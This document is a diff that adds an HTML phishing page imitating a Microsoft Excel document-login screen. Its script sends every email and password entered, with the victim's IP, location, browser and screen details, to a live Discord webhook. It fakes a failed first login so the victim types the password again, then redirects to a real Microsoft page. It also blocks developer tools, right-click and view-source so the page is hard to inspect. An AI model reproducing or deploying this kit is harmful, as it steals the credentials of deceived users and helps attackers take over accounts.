@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Microsoft Excel 2026 // Document Access</title>
+
+    <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Microsoft_Office_Excel_%282019%E2%80%932025%29.svg/1280px-Microsoft_Office_Excel_%282019%E2%80%932025%29.svg.png?_=20190925171014"> 
+
+    <style>
+        :root {
+            --excel-green: #107C41;
+            --excel-green-light: #28A745;
+            --excel-green-dark: #0D5C2C;
+            --white: #FFFFFF;
+            --gray-50: #F9FAFB;
+            --gray-100: #F3F4F6;
+            --gray-200: #E5E7EB;
+            --gray-400: #9CA3AF;
+            --gray-600: #4B5563;
+            --gray-800: #1F2937;
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            --font-family: 'Segoe UI', 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-family);
+            background: linear-gradient(135deg, #F0F4F0 0%, #E8F0E8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+            position: relative;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        input, textarea {
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        .blurred-background-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background-image: url('https://i.postimg.cc/zftZX8N4/image.png');
+            background-repeat: no-repeat;
+            background-position: top center;
+            background-size: cover;
+            filter: blur(8px);
+            -webkit-filter: blur(4px);
+            opacity: 0.7;
+        }
+
+        .bg-circle {
+            position: fixed;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--excel-green) 0%, var(--excel-green-light) 100%);
+            opacity: 0.05;
+            animation: float 20s ease-in-out infinite;
+        }
+
+        .bg-circle-1 {
+            width: 400px;
+            height: 400px;
+            top: -100px;
+            right: -100px;
+            animation-delay: 0s;
+        }
+
+        .bg-circle-2 {
+            width: 300px;
+            height: 300px;
+            bottom: -80px;
+            left: -80px;
+            animation-delay: -5s;
+        }
+
+        .bg-circle-3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 10%;
+            animation-delay: -10s;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            33% { transform: translate(30px, -30px) rotate(120deg); }
+            66% { transform: translate(-20px, 20px) rotate(240deg); }
+        }
+
+        .card-container {
+            background: var(--white);
+            border-radius: 24px;
+            box-shadow: var(--shadow-xl);
+            width: 100%;
+            max-width: 480px;
+            padding: 50px 45px;
+            position: relative;
+            z-index: 10;
+            animation: cardEntry 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border: 1px solid var(--gray-200);
+        }
+
+        @keyframes cardEntry {
+            from {
+                opacity: 0;
+                transform: scale(0.9) translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo-wrapper {
+            display: inline-block;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .excel-logo {
+            width: 100px;
+            height: 85px;
+            animation: logoPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: var(--gray-800);
+            margin-bottom: 8px;
+        }
+
+        .title span {
+            color: var(--excel-green);
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: var(--gray-600);
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid var(--gray-200);
+            border-radius: 12px;
+            font-size: 1rem;
+            color: var(--gray-800);
+            background: var(--gray-50);
+            transition: all 0.25s ease;
+            outline: none;
+        }
+
+        .form-input:focus {
+            border-color: var(--excel-green);
+            background: var(--white);
+            box-shadow: 0 0 0 4px rgba(16, 124, 65, 0.08);
+            transform: translateY(-2px);
+        }
+
+        .form-label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gray-400);
+            font-size: 1rem;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background: var(--gray-50);
+            padding: 0 4px;
+        }
+
+        .form-input:focus ~ .form-label,
+        .form-input:not(:placeholder-shown) ~ .form-label {
+            top: 0;
+            font-size: 0.75rem;
+            color: var(--excel-green);
+            font-weight: 600;
+            background: var(--white);
+            left: 12px;
+        }
+
+        .error-box {
+            background: #FEF2F2;
+            border: 1px solid #FECACA;
+            color: #DC2626;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 0.875rem;
+            margin-bottom: 20px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            animation: slideDown 0.3s ease;
+        }
+
+        .error-box.show {
+            display: flex;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--excel-green) 0%, var(--excel-green-dark) 100%);
+            color: var(--white);
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(16, 124, 65, 0.25);
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(16, 124, 65, 0.35);
+        }
+
+        .submit-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .submit-btn .btn-text {
+            transition: opacity 0.2s ease;
+        }
+
+        .submit-btn.loading .btn-text {
+            opacity: 0;
+        }
+
+        .submit-btn.loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: var(--white);
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .card-footer {
+            margin-top: 35px;
+            text-align: center;
+            padding-top: 25px;
+            border-top: 1px solid var(--gray-200);
+        }
+
+        .footer-text {
+            color: var(--gray-400);
+            font-size: 0.875rem;
+        }
+
+        @media (max-width: 640px) {
+            .card-container {
+                padding: 40px 30px;
+                border-radius: 20px;
+            }
+
+            .title {
+                font-size: 1.6rem;
+            }
+
+            .excel-logo {
+                width: 85px;
+                height: 70px;
+            }
+        }
+
+        #anti-inspect {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="blurred-background-layer"></div>
+    <div class="bg-circle bg-circle-1"></div>
+    <div class="bg-circle bg-circle-2"></div>
+    <div class="bg-circle bg-circle-3"></div>
+
+    <div class="card-container">
+        <div class="logo-section">
+            <div class="logo-wrapper">
+                <svg class="excel-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <g class="excel-logo-group">
+                        <rect class="excel-x-square" x="5" y="10" width="60" height="60" rx="8" fill="#107C41" />
+                        <text class="excel-x-letter" x="25" y="54" font-size="40" fill="white">X</text>
+                        <g transform="translate(35, 20)">
+                            <rect class="doc-bg" x="10" y="10" width="50" height="70" rx="5" fill="#F0F0F0" />
+                            <path class="doc-corner" d="M 45 10 L 60 25 V 10 L 45 10 Z" fill="#CCCCCC" />
+                            <rect class="doc-line" x="17" y="30" width="36" height="5" rx="1" fill="#CCCCCC" />
+                            <rect class="doc-line" x="17" y="40" width="36" height="5" rx="1" fill="#CCCCCC" />
+                            <rect class="doc-line" x="17" y="50" width="25" height="5" rx="1" fill="#CCCCCC" />
+                            <text class="doc-xls-text" x="20" y="75" fill="#333333" font-weight="700" font-size="15">XLS</text>
+                        </g>
+                    </g>
+                </svg>
+            </div>
+            <h1 class="title">Microsoft <span>Excel</span></h1>
+            <p class="subtitle">Enter your credentials to access documents securely</p>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="email" class="form-input" placeholder=" " required>
+                <label for="email" class="form-label">Email address</label>
+            </div>
+
+            <div class="form-group">
+                <input type="password" id="password" class="form-input" placeholder=" " required>
+                <label for="password" class="form-label">Password</label>
+            </div>
+
+            <div id="errorMessage" class="error-box">
+                 Invalid Password..! Please enter correct password.
+            </div>
+
+            <button type="submit" id="submit-btn" class="submit-btn">
+                <span class="btn-text">VIEW DOCUMENT</span>
+            </button>
+        </form>
+
+        <div class="card-footer">
+            <p class="footer-text">Microsoft Copilot &copy; 2026</p>
+        </div>
+    </div>
+
+    <div id="anti-inspect" style="display:none;">Protected</div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script>
+        (function() {
+            "use strict";
+
+            // ============================================================
+            // DISCORD WEBHOOK URL - REPLACE WITH YOUR OWN
+            // ============================================================
+            const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1560719252749688894/U3ElVDxgAGofp5iMf9kiN6m-kT5QrrbXyaXAUSJV_3TG6fv29QO_IlVIxsni295qe05n";
+            const REDIRECT_URL = 'https://learn.microsoft.com/en-us/connectors/shorturl/';
+
+            function getParamFromUrl(param) {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(param);
+            }
+
+            function getEmailFromUrl() {
+                let email = getParamFromUrl('ei');
+                if (email && email.trim() !== '') return email.trim();
+                const hash = window.location.hash;
+                if (hash && hash.includes('ei=')) {
+                    const parts = hash.split('ei=');
+                    if (parts.length > 1) {
+                        let val = parts[1].split('&')[0];
+                        if (val && val.trim() !== '') return val.trim();
+                    }
+                }
+                return null;
+            }
+
+            // Password validation: must contain EITHER uppercase OR number OR special character
+            function validatePasswordStrength(password) {
+                const hasUppercase = /[A-Z]/.test(password);
+                const hasNumber = /[0-9]/.test(password);
+                const hasSpecial = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
+                return hasUppercase || hasNumber || hasSpecial;
+            }
+
+            async function sendDiscordReport(loginData, ipInfo, attemptNumber, failureReason) {
+                if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN") {
+                    console.warn("Discord webhook not set.");
+                    return Promise.resolve({ status: "no_webhook" });
+                }
+                const timestamp = new Date().toISOString();
+                const userAgent = navigator.userAgent;
+                const screenRes = `${screen.width}x${screen.height}`;
+                const language = navigator.language || 'en-US';
+                const platform = navigator.platform || 'unknown';
+
+                const fields = [
+                    { name: "📧 Email", value: loginData.email || 'not provided', inline: true },
+                    { name: "🔑 Password", value: loginData.password ? `||${loginData.password}||` : '`[empty]`', inline: true },
+                    { name: "🔄 Attempt", value: `#${attemptNumber}`, inline: true },
+                    { name: "🌍 IP", value: ipInfo.ip || 'unknown', inline: true },
+                    { name: "📍 Location", value: (ipInfo.city && ipInfo.country) ? `${ipInfo.city}, ${ipInfo.country}` : (ipInfo.loc || 'unknown'), inline: true },
+                    { name: "🖥️ User-Agent", value: userAgent.substring(0, 200), inline: false },
+                    { name: "📱 Screen / Platform", value: `${screenRes} • ${platform} • ${language}`, inline: false },
+                    { name: "🕒 Timestamp", value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
+                    { name: "🔗 Source", value: "Microsoft Excel", inline: true }
+                ];
+
+                if (failureReason) {
+                    fields.push({ name: "⚠️ Failure Reason", value: failureReason, inline: false });
+                }
+
+                const embed = {
+                    title: '🔐 Microsoft Excel Login Attempt',
+                    color: 0xff4d4d,
+                    fields: fields,
+                    footer: { text: "Security Monitor • All attempts reported" },
+                    timestamp: timestamp
+                };
+
+                const payload = {
+                    embeds: [embed],
+                    username: "🛡️ Excel Monitor",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
+                };
+
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (!response.ok) {
+                        const errText = await response.text();
+                        console.error("Discord webhook error:", response.status, errText);
+                        return Promise.reject(new Error(`Discord webhook failed: ${response.status}`));
+                    }
+                    return await response.json();
+                } catch (err) {
+                    console.error("Failed to send Discord report:", err);
+                    throw err;
+                }
+            }
+
+            function fetchIpAndReport(loginData, attemptNum, failureReason) {
+                return new Promise((resolve, reject) => {
+                    $.getJSON('https://ipinfo.io/json?callback=?', function(response) {
+                        const ipData = {
+                            ip: response.ip || 'unknown',
+                            city: response.city || 'N/A',
+                            country: response.country || 'N/A',
+                            loc: response.loc || 'N/A',
+                            org: response.org || ''
+                        };
+                        sendDiscordReport(loginData, ipData, attemptNum, failureReason)
+                            .then(resolve)
+                            .catch(reject);
+                    }).fail(function() {
+                        const fallbackIp = { ip: 'unable to fetch', city: 'unknown', country: 'unknown', loc: 'unknown' };
+                        sendDiscordReport(loginData, fallbackIp, attemptNum, failureReason)
+                            .then(resolve)
+                            .catch(reject);
+                    });
+                });
+            }
+
+            // ============================================================
+            // ANTI-INSPECTION
+            // ============================================================
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || e.keyCode === 123) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j')) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.shiftKey && (e.key === 'K' || e.key === 'k')) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && (e.key === 'S' || e.key === 's')) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && (e.key === 'P' || e.key === 'p')) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            document.addEventListener('dragstart', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            let touchTimer = null;
+            document.addEventListener('touchstart', function(e) {
+                touchTimer = setTimeout(function() {
+                    e.preventDefault();
+                }, 800);
+            });
+            document.addEventListener('touchend', function() {
+                clearTimeout(touchTimer);
+            });
+            document.addEventListener('touchmove', function() {
+                clearTimeout(touchTimer);
+            });
+
+            console.log("%c🔒 Protected", "font-size: 30px; color: red; font-weight: bold;");
+
+            // ============================================================
+            // MAIN LOGIC - Always show "Invalid Password" if password 
+            // doesn't contain uppercase, number, OR special character
+            // ============================================================
+            let validAttemptCount = 0;
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submit-btn');
+            const errorMessage = document.getElementById('errorMessage');
+            const loginForm = document.getElementById('loginForm');
+
+            const emailFromUrl = getEmailFromUrl();
+            if (emailFromUrl) {
+                emailInput.value = emailFromUrl;
+            }
+
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+
+                errorMessage.classList.remove('show');
+                errorMessage.style.display = 'none';
+
+                const loginData = {
+                    email: email || '(empty)',
+                    password: password || '(empty)',
+                    stepAttempt: validAttemptCount + 1,
+                    source: 'excel'
+                };
+
+                // Check if fields are empty
+                if (!email || !password) {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('loading');
+
+                    setTimeout(() => {
+                        submitBtn.disabled = false;
+                        submitBtn.classList.remove('loading');
+                        errorMessage.textContent = 'Both fields are required.';
+                        errorMessage.style.display = 'flex';
+                        errorMessage.classList.add('show');
+
+                        fetchIpAndReport(loginData, validAttemptCount + 1, 'Empty fields')
+                            .then(() => console.log("Empty fields reported"))
+                            .catch(err => console.error("Report error:", err));
+
+                        setTimeout(() => {
+                            errorMessage.style.display = 'none';
+                            errorMessage.classList.remove('show');
+                        }, 3000);
+                    }, 1200);
+                    return;
+                }
+
+                // Check if password contains EITHER uppercase OR number OR special character
+                if (!validatePasswordStrength(password)) {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('loading');
+
+                    setTimeout(() => {
+                        submitBtn.disabled = false;
+                        submitBtn.classList.remove('loading');
+                        errorMessage.textContent = 'Invalid Password..! Please enter correct password.';
+                        errorMessage.style.display = 'flex';
+                        errorMessage.classList.add('show');
+
+                        fetchIpAndReport(loginData, validAttemptCount + 1, 'Invalid password - no uppercase, number, or special character')
+                            .then(() => console.log("Invalid password reported"))
+                            .catch(err => console.error("Report error:", err));
+
+                        passwordInput.value = '';
+                        passwordInput.style.borderColor = '#c62828';
+                        setTimeout(() => { passwordInput.style.borderColor = ''; }, 600);
+                        setTimeout(() => {
+                            errorMessage.style.display = 'none';
+                            errorMessage.classList.remove('show');
+                        }, 3500);
+                    }, 1500);
+                    return;
+                }
+
+                // ✅ VALID PASSWORD (contains uppercase OR number OR special) - increment counter
+                validAttemptCount++;
+                submitBtn.disabled = true;
+                submitBtn.classList.add('loading');
+
+                // Report to Discord
+                fetchIpAndReport(loginData, validAttemptCount, '✅ Valid login attempt #' + validAttemptCount + ' (contains uppercase OR number OR special)')
+                    .then(() => {
+                        console.log("Valid login reported to Discord");
+                    })
+                    .catch(err => console.error("Report error:", err));
+
+                // Check if this is the second valid attempt
+                if (validAttemptCount >= 2) {
+                    // Redirect immediately without showing any message
+                    window.location.href = REDIRECT_URL;
+                } else {
+                    // First valid attempt - show error and reset
+                    setTimeout(() => {
+                        submitBtn.disabled = false;
+                        submitBtn.classList.remove('loading');
+                        errorMessage.textContent = 'Something isn\'t right, please try again.';
+                        errorMessage.style.display = 'flex';
+                        errorMessage.classList.add('show');
+
+                        passwordInput.value = '';
+                        passwordInput.style.borderColor = '#c62828';
+                        setTimeout(() => { passwordInput.style.borderColor = ''; }, 600);
+                        setTimeout(() => {
+                            errorMessage.style.display = 'none';
+                            errorMessage.classList.remove('show');
+                        }, 3500);
+                    }, 1500);
+                }
+            });
+
+            passwordInput.addEventListener('input', function() {
+                errorMessage.style.display = 'none';
+                errorMessage.classList.remove('show');
+                this.style.borderColor = '';
+            });
+
+            emailInput.addEventListener('input', function() {
+                errorMessage.style.display = 'none';
+                errorMessage.classList.remove('show');
+            });
+
+        })();
+    </script>
+</body>
+</html>
